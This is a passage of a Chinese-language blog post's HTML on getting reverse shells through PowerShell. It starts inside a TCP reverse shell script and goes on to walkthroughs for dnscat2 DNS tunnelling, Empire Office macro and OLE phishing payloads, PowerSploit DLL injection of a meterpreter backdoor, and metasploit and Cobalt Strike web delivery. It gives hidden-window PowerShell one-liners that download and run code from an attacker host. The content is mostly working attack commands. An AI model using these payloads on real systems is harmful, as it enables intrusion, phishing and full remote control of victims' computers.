&apos; + (pwd).Path + &apos;&gt; &apos;</span><br><span class="line">$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)</span><br><span class="line">$stream.Write($sendbyte,0,$sendbyte.Length)</span><br><span class="line">$stream.Flush()</span><br><span class="line">&#125;</span><br><span class="line">$client.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="4-dnscat2-反弹DNS-shell"><a href="#4-dnscat2-反弹DNS-shell" class="headerlink" title="4) dnscat2 反弹DNS shell"></a>4) dnscat2 反弹DNS shell</h3><p>dnscat2(<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a> )是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(<a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell</a>)</p>
+<h4 id="利用dnscat2-和-dnscat2-powershell实现反弹DNS-shell"><a href="#利用dnscat2-和-dnscat2-powershell实现反弹DNS-shell" class="headerlink" title="利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:"></a>利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:</h4><p>攻击者(Ubuntu 14.04 LTS 192.168.159.129)开启监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.159.129&quot; --no-cache -e open</span><br><span class="line">-e open 不使用加密连接，默认使用加密</span><br><span class="line">ruby dnscat2.rb —help 查看帮助</span><br></pre></td></tr></table></figure></p>
+<p>目标机执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&apos;);Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.159.129</span><br></pre></td></tr></table></figure></p>
+<p>成功反弹shell后，攻击者：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session -i 1 #进入到session 1</span><br><span class="line">shell #执行之后会新生成一个session 需要通过session -i 2 切换</span><br><span class="line">session -i 2</span><br></pre></td></tr></table></figure></p>
+<h3 id="5-Empire-结合office反弹shell"><a href="#5-Empire-结合office反弹shell" class="headerlink" title="5) Empire 结合office反弹shell"></a>5) Empire 结合office反弹shell</h3><p>Empire(<a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a> ) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell</p>
+<h4 id="利用office-宏反弹shell"><a href="#利用office-宏反弹shell" class="headerlink" title="利用office 宏反弹shell"></a>利用office 宏反弹shell</h4><p>攻击者(192.168.159.134)开启监听:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uselistener http</span><br><span class="line">execute</span><br><span class="line">back</span><br><span class="line">usestager windows/macro http #生成payload</span><br><span class="line">execute</span><br></pre></td></tr></table></figure></p>
+<p>生成/tmp/macro 攻击代码后，新建一个word 创建宏</p>
+<p>点击“文件”-“宏”-“创建”，删除自带的脚本，复制进去/tmp/macro文件内容，并保存为“Word 97-2003文档(.doc)”或者“启用宏的Word 文档(.docm)”文件，当诱导目标打开，执行宏后，即可成功反弹shell：<br>说明:需要开启宏或者用户手动启用宏。开启宏设置：“文件”-“选项”-“信任中心”,选择“启用所有宏”</p>
+<h4 id="利用office-OLE对象插入bat文件反弹shell"><a href="#利用office-OLE对象插入bat文件反弹shell" class="headerlink" title="利用office OLE对象插入bat文件反弹shell"></a>利用office OLE对象插入bat文件反弹shell</h4><p>攻击者(192.168.159.134)开启监听 并生成bat文件payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">listeners</span><br><span class="line">usestager windows/launcher_bat http</span><br><span class="line">execute</span><br></pre></td></tr></table></figure></p>
+<p>在word中“插入”-“对象”-“由文件创建” 处，插入launcher.bat文件，可更改文件名称和图标，进行伪装，当诱导目标点击launcher_lltest.xls文件，执行后，即可成功反弹shell：</p>
+<h3 id="6-PowerSploit-DLL注入反弹shell"><a href="#6-PowerSploit-DLL注入反弹shell" class="headerlink" title="6) PowerSploit DLL注入反弹shell"></a>6) PowerSploit DLL注入反弹shell</h3><p>PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。<br>利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell</p>
+<p>1）msfvenom生成dll后门<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.134 lport=6667 -f dll -o /var/www/html/PowerSploit/lltest.dll</span><br></pre></td></tr></table></figure></p>
+<p>说明：目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp</p>
+<p>2）metasploit 设置payload 开启监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.159.134</span><br><span class="line">set LPORT 6667</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<p>3）powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门<br>首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程</p>
+<p>目标机执行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-Process #选择要注入的进程</span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;)</span><br><span class="line">Invoke-DllInjection -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll</span><br></pre></td></tr></table></figure></p>
+<h3 id="7-metasploit反弹shell"><a href="#7-metasploit反弹shell" class="headerlink" title="7) metasploit反弹shell"></a>7) metasploit反弹shell</h3><p>利用metasploit的web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell</p>
+<p>攻击者(192.168.159.134)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set target 2</span><br><span class="line">set LHOST 192.168.159.134</span><br><span class="line">set LPORT 6666</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<p>目标机执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c $f=new-object net.webclient;$f.proxy=[Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring(&apos;http://192.168.159.134:8080/4iNSwaMtwWjm&apos;);</span><br></pre></td></tr></table></figure></p>
+<h3 id="8-Cobalt-strike反弹shell"><a href="#8-Cobalt-strike反弹shell" class="headerlink" title="8) Cobalt strike反弹shell"></a>8) Cobalt strike反弹shell</h3><p>Cobalt strike的Scripted Web Delivery模块，可通过bitsadmin、powershell、python、regsvr32等进行反弹shell，类似metasploit的web_delivery模块<br>说明：安装Cobalt strike时推荐 java version “1.8.0_121”</p>
+<p>1)运行服务端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.159.134 lltest #lltest为连接密码</span><br></pre></td></tr></table></figure></p>
+<p>2)运行客户端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cobaltstrike #用户名随便输入 密码lltest</span><br></pre></td></tr></table></figure></p>
+<p>3)开启监听:<br>首先要创建一个Listener, 点击 Cobalt Strike-&gt;Listeners ，然后点击Add便可创建Listeners</p>
+<p>点击Cobalt Strike-&gt;Listeners<br>payload可选择windows/beacon_http/reverse_http<br>说明：其中windows/beacon 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign 为外部监听器，即msf或者Armitage的监听器。</p>
+<p>4)生成powershell payload:<br>点击Attack -&gt; Web Drive-by -&gt; Scripted Web Delivery<br>Type选择 powershell</p>
+<p>5)目标机执行powershell payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.159.134:83/a&apos;))&quot;</span><br></pre></td></tr></table></figure></p>
+<p>6)成功反弹shell后，右键interact 进入shell</p>
 <p>参考<br><a href="https://decoder.cloud/2017/01/26/dirty-tricks-with-powershell/" target="_blank" rel="noopener">https://decoder.cloud/2017/01/26/dirty-tricks-with-powershell/</a><br><a href="https://www.blackhillsinfosec.com/powershell-dns-command-control-with-dnscat2-powershell/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/powershell-dns-command-control-with-dnscat2-powershell/</a><br><a href="https://enigma0x3.net/2016/03/15/phishing-with-empire/" target="_blank" rel="noopener">https://enigma0x3.net/2016/03/15/phishing-with-empire/</a><br><a href="http://www.hackingarticles.in/command-injection-exploitation-using-web-delivery-linux-windows/" target="_blank" rel="noopener">http://www.hackingarticles.in/command-injection-exploitation-using-web-delivery-linux-windows/</a><br><a href="https://evi1cg.me/archives/Nishang_shells.html" target="_blank" rel="noopener">https://evi1cg.me/archives/Nishang_shells.html</a><br><a href="https://evi1cg.me/archives/Cobalt_strike.html" target="_blank" rel="noopener">https://evi1cg.me/archives/Cobalt_strike.html</a></p>
 
           
